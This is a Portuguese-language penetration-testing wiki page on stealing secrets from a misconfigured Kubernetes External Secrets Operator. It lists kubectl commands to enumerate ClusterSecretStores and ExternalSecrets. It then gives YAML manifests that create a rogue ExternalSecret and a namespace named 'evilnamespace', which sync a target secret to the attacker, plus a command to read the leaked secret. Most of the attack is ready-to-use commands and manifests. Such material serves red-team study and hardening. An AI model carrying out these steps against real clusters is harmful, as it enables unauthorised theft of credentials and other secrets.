# Operador de Segredo Externo

**O autor original desta página é** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Esta página fornece algumas dicas sobre como você pode conseguir roubar segredos de um ESO mal configurado ou de uma aplicação que utiliza ESO para sincronizar seus segredos.

## Aviso Legal

A técnica mostrada abaixo só pode funcionar quando certas circunstâncias são atendidas. Por exemplo, depende dos requisitos necessários para permitir que um segredo seja sincronizado em um namespace que você possui / comprometeu. Você precisa descobrir por si mesmo.

## Pré-requisitos

1. Uma posição em um cluster kubernetes / openshift com privilégios de administrador em um namespace
2. Acesso de leitura pelo menos ao ExternalSecret em nível de cluster
3. Descubra se existem rótulos / anotações necessárias ou associação a grupos necessária que permita ao ESO sincronizar seu segredo. Se tiver sorte, você pode roubar livremente qualquer segredo definido.

### Coletando informações sobre o ClusterSecretStore existente

Supondo que você tenha um usuário com direitos suficientes para ler este recurso; comece listando primeiro os _**ClusterSecretStores**_ existentes.
```sh
kubectl get ClusterSecretStore
```
### Enumeração de ExternalSecret

Vamos supor que você encontrou um ClusterSecretStore chamado _**mystore**_. Continue enumerando seus externalsecret associados.
```sh
kubectl get externalsecret -A | grep mystore
```
_Este recurso é limitado ao escopo do namespace, então a menos que você já saiba em qual namespace procurar, adicione a opção -A para procurar em todos os namespaces._

Você deve obter uma lista de externalsecrets definidos. Vamos supor que você encontrou um objeto externalsecret chamado _**mysecret**_ definido e usado pelo namespace _**mynamespace**_. Reúna um pouco mais de informações sobre que tipo de segredo ele contém.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Montando as peças

A partir daqui, você pode obter o nome de um ou vários nomes de segredos (como definido no recurso Secret). Você terá uma saída semelhante a:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Até agora temos:

* Nomeie um ClusterSecretStore
* Nome de um ExternalSecret
* Nome do segredo

Agora que temos tudo o que precisamos, você pode criar um ExternalSecret (e eventualmente fazer patch/criar um novo Namespace para cumprir os pré-requisitos necessários para sincronizar seu novo segredo):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Depois de alguns minutos, se as condições de sincronização forem atendidas, você deve ser capaz de visualizar o segredo vazado dentro do seu namespace.
```sh
kubectl get secret leaked_secret -o yaml
```
## Referências

{% embed url="https://external-secrets.io/latest/" %}

{% embed url="https://github.com/external-secrets/external-secrets" %}
